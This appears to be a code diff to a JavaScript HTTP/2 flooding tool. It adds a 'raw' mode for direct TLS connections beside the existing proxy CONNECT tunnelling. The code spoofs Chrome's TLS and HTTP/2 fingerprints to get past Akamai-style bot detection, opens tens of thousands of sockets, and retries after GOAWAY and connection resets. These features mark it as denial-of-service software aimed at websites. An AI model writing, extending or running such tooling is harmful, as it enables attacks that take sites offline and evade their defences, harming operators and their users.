@@ -133,7 +133,8 @@ function d() {
 	var parsed = new URL(target);
 	var cipper = n.cipher();
 	var proxy = proxyr.split(':');
-	
+	const isRaw = proxyr === 'raw';
+
 	function e(length) {
 		const characters = "0123456789";
 		let result = "";
@@ -267,26 +268,6 @@ const j = (browser) => {
 };
 const browser = i();
 const headers = j(browser);
-	const agent = new http.Agent({
-		host: proxy[0]
-		, port: proxy[1]
-		, keepAlive: true
-		, keepAliveMsecs: 500000000
-		, maxSockets: 50000
-		, maxTotalSockets: 100000
-	, });
-	const Optionsreq = {
-		agent: agent
-		, method: 'CONNECT'
-		, path: parsed.hostname + ':443'
-		, timeout: 1000
-		, headers: {
-			'Host': parsed.host
-			, 'Proxy-Connection': 'Keep-Alive'
-			, 'Connection': 'Keep-Alive'
-		, }
-	, };
-	connection = http.request(Optionsreq, (res) => {});
 	// Chrome 146 TLS options - matching real browser fingerprint
 	const cipherString = tls12Ciphers.join(':');
 	const TLSOPTION = {
@@ -306,7 +287,7 @@ const headers = j(browser);
 			, host: parsed.host
 			, port: 443
 			, servername: parsed.host
-			, socket: socket
+			, ...(socket ? { socket: socket } : {})
 		});
 		tlsSocket.setKeepAlive(true, 60000);
     tlsSocket.allowHalfOpen = true;
@@ -315,10 +296,36 @@ const headers = j(browser);
 
     return tlsSocket;
 }
-	connection.on('connect', function (res, socket) {
-    const tlsSocket = k(parsed, socket);
-    socket.setKeepAlive(true, 100000);
 
+	// Raw mode: direct TLS, Proxy mode: CONNECT tunnel
+	if (isRaw) {
+		const tlsSocket = k(parsed, null);
+		tlsSocket.on('secureConnect', () => { o(tlsSocket, null); });
+		tlsSocket.on('error', () => { tlsSocket.destroy(); });
+	} else {
+		const agent = new http.Agent({
+			host: proxy[0], port: proxy[1],
+			keepAlive: true, keepAliveMsecs: 500000000,
+			maxSockets: 50000, maxTotalSockets: 100000,
+		});
+		const Optionsreq = {
+			agent: agent, method: 'CONNECT',
+			path: parsed.hostname + ':443', timeout: 1000,
+			headers: { 'Host': parsed.host, 'Proxy-Connection': 'Keep-Alive', 'Connection': 'Keep-Alive' },
+		};
+		const connection = http.request(Optionsreq, () => {});
+		connection.on('connect', (res, socket) => {
+			const tlsSocket = k(parsed, socket);
+			socket.setKeepAlive(true, 100000);
+			o(tlsSocket, socket);
+		});
+		connection.on('error', () => { connection.destroy(); });
+		connection.on('timeout', () => { connection.destroy(); });
+		connection.end();
+	}
+}
+
+	function o(tlsSocket, socket) {
     // Chrome 146 HTTP/2 settings - exact from akamai fingerprint: 1:65536;2:0;4:6291456;6:262144
     let clasq = {
         headerTableSize: 65536,
@@ -451,8 +458,8 @@ b(0, 8, updateWindow)
 		client.on("close", () => {
 			client.destroy();
 			tlsSocket.destroy();
-			socket.destroy();
-			return 
+			if (socket) socket.destroy();
+			return
 		});
 
 
@@ -463,14 +470,14 @@ client.on("error", error => {
         console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
         shouldPauseRequests = true;
         setTimeout(() => {
-           
+
             shouldPauseRequests = false;
         },2000);
     } else if (error.code === 'ECONNRESET') {
-        
+
         shouldPauseRequests = true;
         setTimeout(() => {
-            
+
             shouldPauseRequests = false;
         }, 2000);
     }  else {
@@ -478,20 +485,10 @@ client.on("error", error => {
 
     client.destroy();
 			tlsSocket.destroy();
-			socket.destroy();
+			if (socket) socket.destroy();
 			return
 });
 
 	});
 
-
-	connection.on('error', (error) => {
-		connection.destroy();
-		if (error) return;
-	});
-	connection.on('timeout', () => {
-		connection.destroy();
-		return
-	});
-	connection.end();
 }//
